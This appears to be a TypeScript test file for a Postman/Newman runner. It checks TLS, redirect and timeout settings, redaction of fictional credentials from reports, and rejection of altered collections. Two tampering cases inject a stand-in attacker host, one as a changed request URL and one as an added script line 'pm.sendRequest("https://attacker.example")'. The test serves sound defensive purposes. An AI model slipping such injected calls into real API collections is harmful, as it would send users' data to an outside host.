import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { runPostmanChecks } from '../scripts/postman-runner.mjs';

test('Postman runner restricts reviewed collection and sanitizes reports with TLS/redirect/time limits intact', async () => {
  const collection = JSON.parse(readFileSync('postman/nudge-sandbox.postman_collection.json', 'utf8'));
  const credentials = { clientId: 'fictional-client-id', clientSecret: 'fictional-secret', invoiceId: 'INV2-FICTIONAL' };
  let called = 0;
  const newman = { run(options: any, callback: (error: unknown, summary: unknown) => void) {
    called++; assert.deepEqual(options.reporters, []); assert.equal(options.insecure, false); assert.equal(options.ignoreRedirects, true);
    assert.equal(options.insecureFileRead, false); assert.equal(options.iterationCount, 1); assert.equal(options.bail, true);
    assert.equal(options.timeoutRequest, 20000); assert.equal(options.timeoutScript, 3000); assert.equal(options.timeout, 90000);
    callback(null, { run: { executions: [200, 200, 200].map(code => ({ response: { code, body: credentials.clientSecret }, request: { authorization: credentials.clientId } })), failures: [], stats: { assertions: { total: 4, failed: 0 } }, environment: credentials } });
  } };
  const result = await runPostmanChecks(newman, collection, credentials);
  assert.equal(result.success, true); assert.equal(result.assertions, 4);
  for (const value of Object.values(credentials)) assert.equal(JSON.stringify(result).includes(value), false);
  assert.equal(collection.variable[0].value, '');
  const modified = structuredClone(collection); modified.item[1].request.url = 'https://attacker.example';
  assert.throws(() => runPostmanChecks(newman, modified, credentials), /reviewed/);
  const scriptChanged = structuredClone(collection); scriptChanged.item[0].event[0].script.exec.push('pm.sendRequest("https://attacker.example")');
  assert.throws(() => runPostmanChecks(newman, scriptChanged, credentials), /reviewed/);
  assert.throws(() => runPostmanChecks(newman, collection, { ...credentials, invoiceId: 'invalid' }), /privately/);
  assert.equal(called, 1);
  const failed = await runPostmanChecks({ run(_options: unknown, callback: (error: unknown, summary: unknown) => void) {
    callback(Error('fictional-secret'), { run: { executions: [{ response: { code: 401, body: 'fictional-secret' } }], failures: [{ message: 'fictional-secret' }], stats: { assertions: { total: 1, failed: 1 } } } });
  } }, collection, credentials);
  assert.equal(failed.success, false); assert.equal(JSON.stringify(failed).includes('fictional-secret'), false);
});
